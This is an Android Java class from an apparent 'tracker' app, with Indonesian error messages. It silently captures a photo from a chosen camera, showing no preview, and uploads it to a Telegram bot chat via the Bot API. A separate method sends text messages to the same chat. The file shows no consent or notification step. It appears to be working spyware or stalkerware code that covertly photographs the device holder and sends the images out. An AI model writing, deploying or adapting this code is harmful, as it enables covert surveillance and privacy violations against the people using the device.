package com.smbbotlacak.tracker;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import androidx.annotation.NonNull;

import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.Collections;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class TelegramCameraCapture {

    private static final String TAG = "SMBCameraCapture";
    private static final int CAPTURE_WIDTH  = 1280;
    private static final int CAPTURE_HEIGHT = 720;

    private static final ExecutorService captureExecutor = Executors.newSingleThreadExecutor();

    public interface CaptureCallback {
        void onSuccess(String fileId);
        void onError(String message);
    }

    public static void capture(
            Context context,
            String botToken,
            String chatId,
            int lensFacing,
            String caption,
            CaptureCallback callback
    ) {
        captureExecutor.execute(() -> {
            HandlerThread cameraThread = new HandlerThread("CameraCaptureThread");
            cameraThread.start();
            Handler cameraHandler = new Handler(cameraThread.getLooper());

            Semaphore captureLock = new Semaphore(0);
            AtomicReference<byte[]> jpegResult = new AtomicReference<>(null);
            AtomicReference<String> errorMessage = new AtomicReference<>(null);
            AtomicReference<CameraDevice> cameraDeviceRef = new AtomicReference<>(null);
            AtomicReference<ImageReader> imageReaderRef = new AtomicReference<>(null);

            try {
                CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                String cameraId = findCamera(manager, lensFacing);
                if (cameraId == null) {
                    cameraThread.quitSafely();
                    if (callback != null) callback.onError("Kamera tidak ditemukan");
                    return;
                }

                CameraCharacteristics characteristics = manager.getCameraCharacteristics(cameraId);
                Size[] outputSizes = characteristics
                        .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                        .getOutputSizes(ImageFormat.JPEG);
                Size captureSize = chooseBestSize(outputSizes);

                ImageReader imageReader = ImageReader.newInstance(
                        captureSize.getWidth(), captureSize.getHeight(),
                        ImageFormat.JPEG, 2
                );
                imageReaderRef.set(imageReader);

                imageReader.setOnImageAvailableListener(reader -> {
                    try (Image image = reader.acquireLatestImage()) {
                        if (image != null) {
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] bytes = new byte[buffer.remaining()];
                            buffer.get(bytes);
                            jpegResult.set(bytes);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error reading image buffer", e);
                    } finally {
                        captureLock.release();
                    }
                }, cameraHandler);

                manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(@NonNull CameraDevice camera) {
                        cameraDeviceRef.set(camera);
                        try {
                            Surface readerSurface = imageReader.getSurface();
                            camera.createCaptureSession(
                                    Collections.singletonList(readerSurface),
                                    new CameraCaptureSession.StateCallback() {
                                        @Override
                                        public void onConfigured(@NonNull CameraCaptureSession session) {
                                            try {
                                                CaptureRequest.Builder builder =
                                                        camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                                builder.addTarget(readerSurface);
                                                builder.set(CaptureRequest.CONTROL_AF_MODE,
                                                        CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                                                builder.set(CaptureRequest.CONTROL_AE_MODE,
                                                        CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);

                                                session.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
                                                    @Override
                                                    public void onCaptureCompleted(
                                                            @NonNull CameraCaptureSession s,
                                                            @NonNull CaptureRequest request,
                                                            @NonNull TotalCaptureResult result
                                                    ) {
                                                        Log.d(TAG, "Capture completed successfully");
                                                    }
                                                }, cameraHandler);
                                            } catch (CameraAccessException e) {
                                                Log.e(TAG, "Error creating capture request", e);
                                                errorMessage.set("Capture request failed: " + e.getMessage());
                                                captureLock.release();
                                            }
                                        }

                                        @Override
                                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                            Log.e(TAG, "Camera session configuration failed");
                                            errorMessage.set("Session configuration failed");
                                            captureLock.release();
                                        }
                                    },
                                    cameraHandler
                            );
                        } catch (Exception e) {
                            Log.e(TAG, "Error in onOpened", e);
                            errorMessage.set("onOpened error: " + e.getMessage());
                            captureLock.release();
                        }
                    }

                    @Override
                    public void onDisconnected(@NonNull CameraDevice camera) {
                        camera.close();
                        errorMessage.set("Camera disconnected");
                        captureLock.release();
                    }

                    @Override
                    public void onError(@NonNull CameraDevice camera, int error) {
                        camera.close();
                        errorMessage.set("Camera error code: " + error);
                        captureLock.release();
                    }
                }, cameraHandler);

                // Wait on worker thread (not blocking cameraHandler)
                boolean acquired = captureLock.tryAcquire(10, TimeUnit.SECONDS);

                // Clean up camera resources
                if (cameraDeviceRef.get() != null) {
                    try { cameraDeviceRef.get().close(); } catch (Exception ignored) {}
                }
                if (imageReaderRef.get() != null) {
                    try { imageReaderRef.get().close(); } catch (Exception ignored) {}
                }
                cameraThread.quitSafely();

                byte[] jpeg = jpegResult.get();
                if (jpeg != null && jpeg.length > 0) {
                    try {
                        sendToTelegram(botToken, chatId, jpeg, caption);
                        if (callback != null) callback.onSuccess("ok");
                    } catch (Exception e) {
                        Log.e(TAG, "Telegram upload error", e);
                        if (callback != null) callback.onError(e.getMessage());
                    }
                } else {
                    String err = errorMessage.get() != null ? errorMessage.get() : (acquired ? "Gambar kosong" : "Timeout kamera");
                    if (callback != null) callback.onError(err);
                }

            } catch (SecurityException e) {
                Log.e(TAG, "Camera permission missing", e);
                cameraThread.quitSafely();
                if (callback != null) callback.onError("Izin kamera belum diberikan");
            } catch (Exception e) {
                Log.e(TAG, "General capture exception", e);
                cameraThread.quitSafely();
                if (callback != null) callback.onError(e.getMessage());
            }
        });
    }

    private static void sendToTelegram(String botToken, String chatId, byte[] jpeg, String caption) throws Exception {
        String boundary = "----SMBTelegramBoundary" + System.currentTimeMillis();
        String telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendPhoto";

        HttpURLConnection conn = (HttpURLConnection) new URL(telegramUrl).openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setConnectTimeout(20_000);
        conn.setReadTimeout(20_000);
        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

        try (DataOutputStream out = new DataOutputStream(conn.getOutputStream())) {
            writeField(out, boundary, "chat_id", chatId);
            if (caption != null && !caption.isEmpty()) {
                writeField(out, boundary, "caption", caption);
                writeField(out, boundary, "parse_mode", "HTML");
            }
            out.writeBytes("--" + boundary + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"snapshot.jpg\"\r\n");
            out.writeBytes("Content-Type: image/jpeg\r\n\r\n");
            out.write(jpeg);
            out.writeBytes("\r\n");
            out.writeBytes("--" + boundary + "--\r\n");
            out.flush();
        }

        int responseCode = conn.getResponseCode();
        if (responseCode < 200 || responseCode >= 300) {
            throw new RuntimeException("Telegram API returned HTTP " + responseCode);
        }
        conn.disconnect();
    }

    public static void sendText(String botToken, String chatId, String text) {
        captureExecutor.execute(() -> {
            try {
                String encoded = URLEncoder.encode(text, StandardCharsets.UTF_8.name());
                String urlStr = "https://api.telegram.org/bot" + botToken
                        + "/sendMessage?chat_id=" + URLEncoder.encode(chatId, StandardCharsets.UTF_8.name())
                        + "&text=" + encoded
                        + "&parse_mode=HTML";
                HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(10_000);
                conn.setReadTimeout(10_000);
                int code = conn.getResponseCode();
                Log.d(TAG, "sendText HTTP code: " + code);
                conn.disconnect();
            } catch (Exception e) {
                Log.w(TAG, "sendText error: " + e.getMessage());
            }
        });
    }

    private static void writeField(DataOutputStream out, String boundary, String name, String value) throws Exception {
        out.writeBytes("--" + boundary + "\r\n");
        out.writeBytes("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n");
        out.write(value.getBytes(StandardCharsets.UTF_8));
        out.writeBytes("\r\n");
    }

    private static String findCamera(CameraManager manager, int lensFacing) {
        try {
            for (String id : manager.getCameraIdList()) {
                CameraCharacteristics chars = manager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == lensFacing) return id;
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "findCamera error", e);
        }
        return null;
    }

    private static Size chooseBestSize(Size[] sizes) {
        if (sizes == null || sizes.length == 0) return new Size(1280, 720);
        Size best = sizes[0];
        long targetPixels = (long) CAPTURE_WIDTH * CAPTURE_HEIGHT;
        long bestDiff = Long.MAX_VALUE;
        for (Size s : sizes) {
            long diff = Math.abs((long) s.getWidth() * s.getHeight() - targetPixels);
            if (diff < bestDiff) { bestDiff = diff; best = s; }
        }
        return best;
    }
}
